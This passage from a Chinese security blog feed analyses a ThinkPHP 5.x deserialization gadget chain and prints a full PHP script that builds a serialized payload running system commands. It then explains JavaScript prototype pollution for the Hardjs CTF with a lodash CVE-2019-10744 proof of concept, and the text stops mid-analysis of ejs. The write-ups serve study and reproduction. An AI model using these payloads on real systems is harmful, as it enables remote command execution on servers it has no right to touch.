class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>转到 isAjax 函数的定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>$ajax</code> 参数没有对类型的限制，而且 param 的参数来自 <code>$this-&gt;config</code>，是可控的，param 在最后所调用的 input 函数的 <code>$this-&gt;param, $name</code> 就都可控</p><p>跟进 get 和 route 函数不难发现 <code>$this-&gt;param</code> 的值来自 GET 请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http://127.0.0.1:9000/public/?test=pwd</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$this-&gt;param = array("test"=&gt;"pwd")</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>那么回到 input 函数看处理流程</p><p>首先 <code>$this-&gt;getData($data, $name)</code> 得到 <code>$data</code>，跟进分析，返回 <code>$data</code> 为 <code>$data[$val]</code> 的值，即 <code>$data[$name]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">            $data = $data[$val];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到 input，接着处理 <code>$filter = $this-&gt;getFilter($filter, $default);</code></p><p>getFilter 的两个参数分别为 <code>&#39;&#39;</code> 和 <code>null</code> 且都不可控，但是跟进不难看出最后返回 <code>$filter</code> 的值就是 <code>$this-&gt;filter</code>，虽然后面 <code>$filter[] = $default;</code> 会给 filter 数组追加个值为 <code>null</code> 的元素，但后面 filterValue 中的 array_pop 函数正好给去掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就得到一条可控变量的函数调用链，最后执行命令</p><p><img src="https://i.loli.net/2019/10/03/eUh8BInif3zjXZC.png" alt></p><p>下面简单梳理下流程</p><ol><li><p>通过 Windows 类 <code>__destruct()</code> 方法调用到 <code>file_exists</code> 触发某类的 <code>__toString()</code> 来到 <code>toArray()</code> 函数</p></li><li><p>通过控制分别位于 Attribute 和 Conversion 的 <code>$data</code> 和 <code>$append</code> 变量执行在 Request 中不存在的 <code>visible</code> 函数进而触发其 <code>__call()</code></p></li><li><p>在 Request 通过控制 <code>$hook $filter $config</code> 三个变量的值注入最终的 callback 名称和参数，再经这么一系列函数调用执行命令</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call() ---&gt; call_user_func_array() ---&gt; isAjax() ---&gt; param() ---&gt; input() ---&gt; filterValue() ---&gt; call_user_func()</span><br></pre></td></tr></table></figure><p>画个图就直观多了</p><p><img src="https://i.loli.net/2019/10/12/2dkOGY7IWPcSjFt.png" alt></p><p>构造 Payload</p><p>由于 Model 类是 abstract 类型，无法实例化，而extends Model 的也只有一个 Pivot 类，所以就用它吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"a"</span>=&gt;[<span class="string">""</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"a"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>自己先构造一个利用点反序列化我们的内容，生成好 payload，GET 传入要执行的命令，命令别忘了 urlencode</p><p><img src="https://i.loli.net/2019/10/03/VLxya37wOjihbSm.png" alt></p><p>查看调用堆栈</p><p><img src="https://i.loli.net/2019/10/03/pFUwl2T94GqOyng.png" alt></p><hr><p>Reference:</p><p><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a><br><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发于合天智汇：&lt;a href=&quot;https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ThinkPHP 反序列化" scheme="http://j0k3r.top/tags/ThinkPHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 原型链污染 (Prototype Pollution) &amp;&amp; Hardjs 复现与分析</title>
    <link href="http://j0k3r.top/2019/09/10/js_prototype_pollution/"/>
    <id>http://j0k3r.top/2019/09/10/js_prototype_pollution/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2019-09-13T07:32:40.546Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01 基本知识"></a>0x01 基本知识</h2><p>在 JavaScript 中有一点与 Python 一样，那就是 “一切皆对象”</p><p>对象的定义：</p><p><strong>1.</strong> 直接定义一个对象</p><p><img src="https://i.loli.net/2019/09/09/H2bGIxaKB9tNlgO.png" alt></p><p>这种方式无需使用类模版，也就是类似以下这种定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Ob1 = Object()</span><br><span class="line">Ob2 = Object()</span><br></pre></td></tr></table></figure><p><strong>2.</strong> 使用构造函数定义类模版</p><p><img src="https://i.loli.net/2019/09/09/fqEeP2kwoOizurJ.png" alt></p><p>这样方便批量实例化对象</p><p>对象的属性通过<strong>方括号</strong>或<strong><code>.</code></strong>来访问</p><p><img src="https://i.loli.net/2019/09/09/oajI5NRqYOyn4bJ.png" alt></p><h3 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype (原型)"></a>prototype (原型)</h3><p>在 ES4 中对 prototype 有这样的描述：</p><blockquote><p>每个类对象都有一个常量属性原型，它保存对作为<strong><em>类实例原型的对象</em></strong>的引用，并且每个实例都有一个隐藏的引用到它的原型。原型包含在引用它的所有对象之间共享的值。对象原型上的属性在偶然观察者看来是对象本身的属性：从对象中读取属性将在原型中找到属性（如果在那里定义而不是在对象中）。(Google 翻译)</p></blockquote><p>举个例子：这里我整一个 Array 对象 a1，并给它一个 sum 方法求和</p><p><img src="https://i.loli.net/2019/09/10/zP64AyKrVe7qScD.png" alt></p><p>能看到 <code>a1.sum()</code> 顺利求和，而同为 Array 对象的 a2 确不行，如果要让所有的 Array 对象都能够拥有 sum 求和方法怎么办，可以通过修改 Array 的原型来实现，添加一个 <code>Array.prototype.sum</code> 即可</p><p><img src="https://i.loli.net/2019/09/10/2kMArnTQ4RJgpDU.png" alt></p><p>这样应该就很好理解原型了，可以将其看作是 CSS 里面的 class，修改了 class 后，所有使用该 class 的 html 元素的样式都会被改变，无须对每个元素用 style 了</p><h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h3><p><strong><em>对象<code>__proto__</code>属性的值就是它所对应的原型对象</em></strong></p><p>因为所有实例对象都拥有一个 <code>__proto__</code>，用于访问其原型对象，而原型对象又引出它的原型对象, 这么一层层的调用下来就构成了 “原型链”</p><p>接着上面的例子，调用到最后没有了原型对象便是 <code>NULL</code> 了</p><p><img src="https://i.loli.net/2019/09/09/LtPQh8GWOSdmTUy.png" alt></p><p>创建函数时，JS 会为这个函数自动添加 prototype 属性，值是一个有 constructor 属性的对象。而一旦你把这个函数当作构造函数（constructor）调用（即通过new关键字调用），那么 JS 就会帮你创建该构造函数的实例，实例继承构造函数 prototype 的所有属性和方法（实例通过设置自己的 <code>__proto__</code> 指向构造函数的 prototype 来实现这种继承）</p><p>使用 <code>__proto__</code> 修改原型属性示例</p><p><img src="https://i.loli.net/2019/09/10/jevcdxBlgP29kSa.png" alt></p><h2 id="0x02-Hardjs"><a href="#0x02-Hardjs" class="headerlink" title="0x02 Hardjs"></a>0x02 Hardjs</h2><p>在安装好依赖后，使用 <code>npm audit</code> 检测依赖有没有漏洞 ，报错的可以试下挂个代理用 proxychains4 后面再加上 <code>--registry=https://registry.npmjs.org</code></p><p><img src="https://i.loli.net/2019/09/09/7nxjiz1TuJg4hAH.png" alt></p><p>检测到了 lodash 的一个原型链污染漏洞</p><p>在源码到第 182 行调用了 lodash</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">. . .  . . . </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>从 package.json 能看到 lodash 版本为 4.17.11，对应漏洞 CVE-2019-10744，可以利用函数 defaultsDeep 添加或修改 Object.prototype 的属性，漏洞 PoC</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure><p>这里明显就是将构造好的 Payload 数据插入多次，然后访问 /get 即可触发原型链污染，问题是要污染什么地方</p><p>从一开始就引入了 ejs 来渲染模版，那么从 <code>res.render(&#39;index&#39;);</code> 开始分析，Goto Definition 转到定义</p><p>/node_modules/express/lib/response.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line"> . . .  . . . </span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>调用了 app.render，继续跟</p><p>/node_modules/express/lib/application.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="keyword">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="keyword">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line"></span><br><span class="line"> . . .   . . .</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>tryRender 同样位于 application.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 view.render </p><p>/node_modules/express/lib/view.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = function render(options, callback) &#123;</span><br><span class="line">  debug(&apos;render &quot;%s&quot;&apos;, this.path);</span><br><span class="line">  this.engine(this.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>开始调用模版渲染引擎，这里会根据模版文件后缀自动调用相应的模块，如 View 中有关代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load engine</span></span><br><span class="line"><span class="keyword">var</span> mod = <span class="keyword">this</span>.ext.substr(<span class="number">1</span>)</span><br><span class="line">debug(<span class="string">'require "%s"'</span>, mod)</span><br><span class="line"></span><br><span class="line"><span class="comment">// default engine export</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).__express</span><br></pre></td></tr></table></figure><p>注意这个默认引擎出口 <code>var fn = require(mod).__express</code>，在 ejs.js 914 行有定义 <code>exports.__express = exports.renderFile;</code>，也就是默认使用 renderFile 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 